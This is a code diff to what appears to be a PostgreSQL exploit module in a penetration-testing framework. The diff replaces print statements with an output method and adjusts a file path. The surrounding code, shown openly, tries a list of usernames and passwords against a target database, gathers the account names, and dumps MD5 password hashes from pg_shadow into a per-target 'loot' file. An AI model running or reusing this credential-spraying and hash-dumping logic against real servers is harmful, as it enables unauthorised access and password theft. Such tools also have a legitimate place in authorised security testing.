@@ -16,14 +16,14 @@ class postgresql(Exploit):
         for victim in credentials:
             username = victim[0]
             password = victim[1]
-            print("Trying to connect to PostgreSQL with IP address {} with:\n username {} and password {}".format(ip_address, username, password))
+            file=self.output("Trying to connect to PostgreSQL with IP address {} with:\n username {} and password {}".format(ip_address, username, password))
 
             # start the log in process
             try:
                 trystr = "dbname=postgres host={} user={} password={}".format(ip_address, username, password)
                 conn = psycopg2.connect(trystr)
             except psycopg2.OperationalError:
-                print("Authentication failed.")
+                file=self.output("Authentication failed.")
                 continue
 
             # opens a cursor to perform psql ops    
@@ -36,7 +36,7 @@ class postgresql(Exploit):
             except (psycopg2.OperationalError, psycopg2.InternalError) as e:
                 continue
             # opening up returns
-            print('Success. Gathering all usernames.')
+            file=self.output('Success. Gathering all usernames.')
             for l in cur.fetchall():
                 # adds if the username is not already in there
                 if loot_dict.get(l[0]) == None:
@@ -45,13 +45,13 @@ class postgresql(Exploit):
             # tries to possibly get md5 hashes if in case it is a superuser
             try:
                 cur.execute("select usename, passwd from pg_shadow")
-                with open(f"../data/{ip_address}_postgresql_md5.txt", "w") as text_file:
+                with open(f"./data/{ip_address}_postgresql_md5.txt", "w") as text_file:
                     for l in cur.fetchall():
                         text_file.write(l[1])
-                print('Success. Gathering all md5 hashes.')
+                file=self.output('Success. Gathering all md5 hashes.')
                         
             except psycopg2.ProgrammingError:
-                print('No MD5 hashes found.')
+                file=self.output('No MD5 hashes found.')
                 pass
 
         for k, v in loot_dict.items():
